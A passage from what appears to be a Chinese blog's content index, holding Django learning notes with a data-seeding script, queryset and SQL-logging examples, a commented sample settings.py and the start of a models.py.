class=\"keyword\">return</span> self.name</span><br></pre></td></tr></table></figure></p>\n<p>导入数据 initdb.py<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 _*-</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">author:seck</span></span><br><span class=\"line\"><span class=\"string\">time: 2018/01/26</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">from</span> blog_week_5.wsgi <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Model_study.models <span class=\"keyword\">import</span> Author, Article, Tag</span><br><span class=\"line\">author_name_list = [<span class=\"string\">'xjnu'</span>, <span class=\"string\">'seck'</span>, <span class=\"string\">'sfdx'</span>, <span class=\"string\">'test'</span>, <span class=\"string\">'xjseck'</span>]</span><br><span class=\"line\">article_title_list = [<span class=\"string\">'Django 笔记'</span>, <span class=\"string\">'Python 学习'</span>, <span class=\"string\">'HTML 学习'</span>]</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create_authors</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> author_name <span class=\"keyword\">in</span> author_name_list:</span><br><span class=\"line\">        author, created = Author.objects.get_or_create(name=author_name)</span><br><span class=\"line\">        <span class=\"comment\"># 随机生成9位数的QQ，</span></span><br><span class=\"line\">        author.qq = <span class=\"string\">''</span>.join(</span><br><span class=\"line\">            str(random.choice(range(<span class=\"number\">10</span>))) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> range(<span class=\"number\">9</span>)</span><br><span class=\"line\">        )</span><br><span class=\"line\">        author.addr = <span class=\"string\">'addr_%s'</span> % (random.randrange(<span class=\"number\">1</span>, <span class=\"number\">3</span>))</span><br><span class=\"line\">        author.email = <span class=\"string\">'%s@seck.com'</span> % (author.addr)</span><br><span class=\"line\">        author.save()</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create_articles_and_tags</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># 随机生成文章</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> article_title <span class=\"keyword\">in</span> article_title_list:</span><br><span class=\"line\">        <span class=\"comment\"># 从文章标题中得到 tag</span></span><br><span class=\"line\">        tag_name = article_title.split(<span class=\"string\">' '</span>, <span class=\"number\">1</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        tag, created = Tag.objects.get_or_create(name=tag_name)</span><br><span class=\"line\">        random_author = random.choice(Author.objects.all())</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, <span class=\"number\">21</span>):</span><br><span class=\"line\">            title = <span class=\"string\">'%s_%s'</span> % (article_title, i)</span><br><span class=\"line\">            article, created = Article.objects.get_or_create(</span><br><span class=\"line\">                title=title, defaults=&#123;</span><br><span class=\"line\">                    <span class=\"string\">'author'</span>: random_author,  <span class=\"comment\"># 随机分配作者</span></span><br><span class=\"line\">                    <span class=\"string\">'content'</span>: <span class=\"string\">'%s 正文'</span> % title,</span><br><span class=\"line\">                    <span class=\"string\">'score'</span>: random.randrange(<span class=\"number\">70</span>, <span class=\"number\">101</span>),  <span class=\"comment\"># 随机给文章一个打分</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            )</span><br><span class=\"line\">            article.tags.add(tag)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    create_authors()</span><br><span class=\"line\">    create_articles_and_tags()</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\">    print(<span class=\"string\">\"Done!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">Django queryset 进行的操作</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li><p>查看所执行的SQL语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python manage.py shell</span><br><span class=\"line\">&gt;&gt;&gt;from Model_study.models import Article,Author,Tag</span><br><span class=\"line\">&gt;&gt;&gt; print str(Author.objects.all().query)  #打印所执行的sql语句</span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.all().query.__str__() #这样也可以（只对select有用）</span><br><span class=\"line\">&gt;&gt;&gt; Author=Author.objects.values_list(&apos;name&apos;,&apos;qq&apos;)</span><br><span class=\"line\">&gt;&gt;&gt; Author   #以元祖形式输出结果</span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.values_list(&apos;name&apos;,flat=True) #指定一个字段</span><br><span class=\"line\">&gt;&gt;&gt; Article.objects.filter(author__name=&apos;xjnu&apos;).values_list(&apos;title&apos;,flat=True) #多表查询</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查询结果排序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;Author.objects.all().order_by(&apos;name&apos;) </span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.all().order_by(&apos;-name&apos;); #倒序排列</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>支持正则 Where 查询</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;Author.objects.filter(name__regex=&apos;^s.+&apos;).exclude(qq=399753917)</span><br><span class=\"line\">#字段名+ 两个下划线 参考https://www.cnblogs.com/BigJ/p/7530516.html </span><br><span class=\"line\">#exclude 类似SQL语句的where</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>索引查询</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; Author.objects.all()[:1]  #不支持负数</span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.all().reverse()[0]</span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.order_by(&apos;-id&apos;)[0]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>和SQL语句进行显示调试，此方法能显示所有执行的sql语句</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    首先在settings.py最后加上</span><br><span class=\"line\">    LOGGING = &#123;</span><br><span class=\"line\">    <span class=\"string\">'version'</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"string\">'disable_existing_loggers'</span>: <span class=\"keyword\">False</span>,</span><br><span class=\"line\">    <span class=\"string\">'handlers'</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">'console'</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">'class'</span>: <span class=\"string\">'logging.StreamHandler'</span>,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">'loggers'</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">'django.db.backends'</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">'handlers'</span>: [<span class=\"string\">'console'</span>],</span><br><span class=\"line\">            <span class=\"string\">'level'</span>: <span class=\"string\">'DEBUG'</span> <span class=\"keyword\">if</span> DEBUG <span class=\"keyword\">else</span> <span class=\"string\">'INFO'</span>,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    然后在$python manage.py shell</span><br><span class=\"line\">    下进行操作会显示sql语句</span><br><span class=\"line\">    &gt;&gt;&gt; <span class=\"keyword\">from</span> Model_study.models <span class=\"keyword\">import</span> Article,Author ,Tag</span><br><span class=\"line\">    &gt;&gt;&gt; a=Article.objects.get(pk=<span class=\"number\">1</span>)</span><br><span class=\"line\">    (<span class=\"number\">0.000</span>) SET SQL_AUTO_IS_NULL = <span class=\"number\">0</span>; args=<span class=\"keyword\">None</span></span><br><span class=\"line\">    (<span class=\"number\">0.000</span>) SET SQL_AUTO_IS_NULL = <span class=\"number\">0</span>; args=<span class=\"keyword\">None</span></span><br><span class=\"line\">    (<span class=\"number\">0.000</span>) SELECT `Model_study_article`.`id`, `Model_study_article`.`title`, `Model_study_article`.`author_id`, `Model_study_article`.`content`, `Model_study_article`.`score` FROM `Model_study_article` WHERE `Model_study_article`.`id` = <span class=\"number\">1</span>; args=(<span class=\"number\">1</span>,)</span><br><span class=\"line\">    &gt;&gt;&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>5.其他常见的操作可以搜索相关的资料</p>\n<h3 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h3><p>本篇中我们主要学习models中对象中的相关操作，常用的数据操作，熟练掌握，后面会对我们实际项目开发中事半功倍，然后介绍Django的ORM怎么操作一对一、一对多、多对多的操作。</p>\n","categories":["Django"],"tags":["Django"]},{"title":"Django学习笔记(二)","url":"https://www.xjseck.com/2018/01/28/Django学习笔记-二/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>学习最快的办法就是动手实践。</p>\n<ul>\n<li>通过上一个笔记的学习，我们应该能学习到了内容如下<ul>\n<li>能使用 Django创建 项目和一些参数的说明</li>\n<li>能清楚Django默认创建项目的文件目录结构</li>\n</ul>\n</li>\n<li>通过本笔记的学习我们可以学习到的知识点如下<ul>\n<li>默认创建的Django配置解读</li>\n<li>创建app</li>\n<li>实例一个MVT</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h3><p>从上一个笔记到这个笔记的过度，需要动手操作才能很好的掌握。Django版本1.8.5<br>实例（二）</p>\n<p>默认的配置文件了解<br>Django相关的配置都在settings.py文件中<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Build paths inside the project like this: os.path.join(BASE_DIR, ...)</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class=\"line\"><span class=\"comment\"># Quick-start development settings - unsuitable for production</span></span><br><span class=\"line\"><span class=\"comment\"># See https://docs.djangoproject.com/en/1.8/howto/deployment/checklist/</span></span><br><span class=\"line\"><span class=\"comment\"># SECURITY WARNING: keep the secret key used in production secret!</span></span><br><span class=\"line\">SECRET_KEY = <span class=\"string\">'abmu19wmz5#1qwmfc_wagpf_vh+8faqs8=#xi=mik1+4*9b*dv'</span></span><br><span class=\"line\"><span class=\"comment\"># SECURITY WARNING: don't run with debug turned on in production!</span></span><br><span class=\"line\">DEBUG = <span class=\"keyword\">False</span>   <span class=\"comment\">#进行调试模式 True为开启</span></span><br><span class=\"line\"><span class=\"comment\"># If this flag set to False, then user can't register account.</span></span><br><span class=\"line\">IS_REGISTER_PERIOD = <span class=\"keyword\">True</span></span><br><span class=\"line\">ALLOWED_HOSTS = [<span class=\"string\">'127.0.0.1'</span>]</span><br><span class=\"line\"><span class=\"comment\"># Application definition  创建的app应用定义到这里</span></span><br><span class=\"line\">INSTALLED_APPS = (</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.admin'</span>, <span class=\"comment\">#管理员站点</span></span><br><span class=\"line\">    <span class=\"string\">'django.contrib.auth'</span>,<span class=\"comment\">#用户验证框架</span></span><br><span class=\"line\">    <span class=\"string\">'django.contrib.contenttypes'</span>,<span class=\"comment\">#文件类型框架</span></span><br><span class=\"line\">    <span class=\"string\">'django.contrib.sessions'</span>,<span class=\"comment\">#会话框架</span></span><br><span class=\"line\">    <span class=\"string\">'django.contrib.messages'</span>,<span class=\"comment\">#消息框架</span></span><br><span class=\"line\">    <span class=\"string\">'django.contrib.staticfiles'</span>,<span class=\"comment\">#静态资源管理框架</span></span><br><span class=\"line\">    <span class=\"string\">'account'</span>,  <span class=\"comment\">#激活应用</span></span><br><span class=\"line\">    <span class=\"string\">'home'</span>,</span><br><span class=\"line\">    <span class=\"string\">'dashboard'</span>,</span><br><span class=\"line\">    <span class=\"string\">'gameboard'</span>,</span><br><span class=\"line\">    <span class=\"string\">'noticeboard'</span>,</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">中间件，介于request 和 response处理之间的一道处理过程，相对比较轻量级，并且在全局上改变，django的输入与输出，因为改变的是全局</span></span><br><span class=\"line\"><span class=\"string\">所以需要谨慎使用，用不好会影响性能，每一个中间件都会负责一个功能，例如AuthentictionMiddleware和session处理相关，</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\">MIDDLEWARE_CLASSES = (</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.sessions.middleware.SessionMiddleware'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.middleware.common.CommonMiddleware'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.middleware.csrf.CsrfViewMiddleware'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.auth.middleware.AuthenticationMiddleware'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.auth.middleware.SessionAuthenticationMiddleware'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.messages.middleware.MessageMiddleware'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.middleware.clickjacking.XFrameOptionsMiddleware'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.middleware.security.SecurityMiddleware'</span>,</span><br><span class=\"line\">)</span><br><span class=\"line\">ROOT_URLCONF = <span class=\"string\">'hexactf.urls'</span><span class=\"comment\">#这个变量的值就是根URLconf的模块名，默认是urls.py 文件的模块名</span></span><br><span class=\"line\">TEMPLATES = [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">'BACKEND'</span>: <span class=\"string\">'django.template.backends.django.DjangoTemplates'</span>,</span><br><span class=\"line\">        <span class=\"string\">'DIRS'</span>: [os.path.join(BASE_DIR, <span class=\"string\">\"static\"</span>, <span class=\"string\">\"templates\"</span>)],  <span class=\"comment\">#指定模板文件目录</span></span><br><span class=\"line\">        <span class=\"string\">'APP_DIRS'</span>: <span class=\"keyword\">True</span>,</span><br><span class=\"line\">        <span class=\"string\">'OPTIONS'</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">'context_processors'</span>: [</span><br><span class=\"line\">                <span class=\"string\">'django.template.context_processors.debug'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.template.context_processors.request'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.contrib.auth.context_processors.auth'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.contrib.messages.context_processors.messages'</span>,</span><br><span class=\"line\">            ],</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">]</span><br><span class=\"line\">WSGI_APPLICATION = <span class=\"string\">'hexactf.wsgi.application'</span></span><br><span class=\"line\"><span class=\"comment\"># Database</span></span><br><span class=\"line\"><span class=\"comment\"># https://docs.djangoproject.com/en/1.8/ref/settings/#databases</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">DATABASES = &#123;</span></span><br><span class=\"line\"><span class=\"string\">    'default': &#123;</span></span><br><span class=\"line\"><span class=\"string\">        'ENGINE': 'django.db.backends.sqlite3',</span></span><br><span class=\"line\"><span class=\"string\">        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">    <span class=\"string\">'default'</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">'ENGINE'</span>: <span class=\"string\">'django.db.backends.mysql'</span>,  <span class=\"comment\">#数据库引擎</span></span><br><span class=\"line\">        <span class=\"string\">'NAME'</span>: <span class=\"string\">'database_name'</span>,</span><br><span class=\"line\">        <span class=\"string\">'USER'</span>: <span class=\"string\">'mysql_id'</span>,</span><br><span class=\"line\">        <span class=\"string\">'PASSWORD'</span>: <span class=\"string\">'mysql_passwd'</span>,</span><br><span class=\"line\">        <span class=\"string\">'HOST'</span>: <span class=\"string\">'localhost'</span>,</span><br><span class=\"line\">        <span class=\"string\">'PORT'</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"># Internationalization</span></span><br><span class=\"line\"><span class=\"comment\"># https://docs.djangoproject.com/en/1.8/topics/i18n/</span></span><br><span class=\"line\">LANGUAGE_CODE = <span class=\"string\">'ko-kr'</span>  <span class=\"comment\">#语言</span></span><br><span class=\"line\">TIME_ZONE = <span class=\"string\">'Asia/Seoul'</span>  <span class=\"comment\">#时区</span></span><br><span class=\"line\">USE_I18N = <span class=\"keyword\">True</span>  <span class=\"comment\">#语言</span></span><br><span class=\"line\">USE_L10N = <span class=\"keyword\">True</span>  <span class=\"comment\">#数据和时间格式</span></span><br><span class=\"line\">USE_TZ = <span class=\"keyword\">False</span>   <span class=\"comment\">#是否启用时区</span></span><br><span class=\"line\"><span class=\"comment\"># Static files (CSS, JavaScript, Images)</span></span><br><span class=\"line\"><span class=\"comment\"># https://docs.djangoproject.com/en/1.8/howto/static-files/</span></span><br><span class=\"line\">STATIC_URL = <span class=\"string\">'/static/'</span></span><br><span class=\"line\">LOGIN_URL = <span class=\"string\">'/account/sign_in/'</span></span><br><span class=\"line\">LOGOUT_URL = <span class=\"string\">'/account/sign_out/'</span></span><br><span class=\"line\">MEDIA_ROOT = os.path.join(BASE_DIR, <span class=\"string\">'static'</span>)</span><br><span class=\"line\">MEDIA_URL = <span class=\"string\">'/media/'</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> DEBUG:</span><br><span class=\"line\">        STATIC_ROOT = os.path.join(BASE_DIR, <span class=\"string\">'/static'</span>, <span class=\"string\">'static'</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">        STATIC_ROOT = os.path.join(BASE_DIR, <span class=\"string\">'static'</span>, <span class=\"string\">'static'</span>)</span><br><span class=\"line\">STATICFILES_DIRS = os.path.join(BASE_DIR, <span class=\"string\">\"static\"</span>, <span class=\"string\">\"static\"</span>),</span><br></pre></td></tr></table></figure></p>\n<p>创建app<br>    $python manage startapp blog<br>编写一个MVT<br>    例子的层级目录如下<br><img src=\"1.jpg\" alt=\"\"><br>首先我们创建好了blog app 添加到settings.py 中<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = (</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.admin'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.auth'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.contenttypes'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.sessions'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.messages'</span>,</span><br><span class=\"line\">    <span class=\"string\">'django.contrib.staticfiles'</span>,</span><br><span class=\"line\">    <span class=\"string\">'blog'</span>,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure></p>\n<p>本例子中涉及到model中的相关内容在model.py中，model.py中的代码如下<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.db <span class=\"keyword\">import</span> models</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.contrib.auth.models <span class=\"keyword\">import</span> User</span><br><span class=\"line\"><span class=\"comment\"># Create your models here.</span></span><br><span class=\"line\"><span class=\"comment\">#  创建数据库表</span></span><br><span class=\"line\"><span class=\"comment\">#step1：类名就是数据库中的表名，要继承models</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Category</span><span class=\"params\">(models.Model)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Django 要求模型必须继承 models.Model 类。</span></span><br><span class=\"line\"><span class=\"string\">    Category 只需要一个简单的分类名 name 就可以了。</span></span><br><span class=\"line\"><span class=\"string\">    CharField 指定了分类名 name 的数据类型，CharField 是字符型，</span></span><br><span class=\"line\"><span class=\"string\">    CharField 的 max_length 参数指定其最大长度，超过这个长度的分类名就不能被存入数据库。</span></span><br><span class=\"line\"><span class=\"string\">    当然 Django 还为我们提供了多种其它的数据类型，如日期时间类型 DateTimeField、整数类型 IntegerField 等等。</span></span><br><span class=\"line\"><span class=\"string\">    Django 内置的全部类型可查看文档：</span></span><br><span class=\"line\"><span class=\"string\">    https://docs.djangoproject.com/en/1.10/ref/models/fields/#field-types</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    name = models.CharField(max_length=<span class=\"number\">100</span>)</span><br><span class=\"line\">    <span class=\"comment\">#python3  使用str  把对象以字符串形式显示  shell模式下all()函数可以显示数据</span></span><br><span class=\"line\">    <span class=\"comment\">#python2.7  使用unicode</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__unicode__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.name</span><br><span class=\"line\">    <span class=\"comment\"># def __str__(self):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return self.name</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tag</span><span class=\"params\">(models.Model)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    标签 Tag 也比较简单，和 Category 一样。</span></span><br><span class=\"line\"><span class=\"string\">    再次强调一定要继承 models.Model 类！</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    name = models.CharField(max_length=<span class=\"number\">100</span>)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__unicode__</span><span 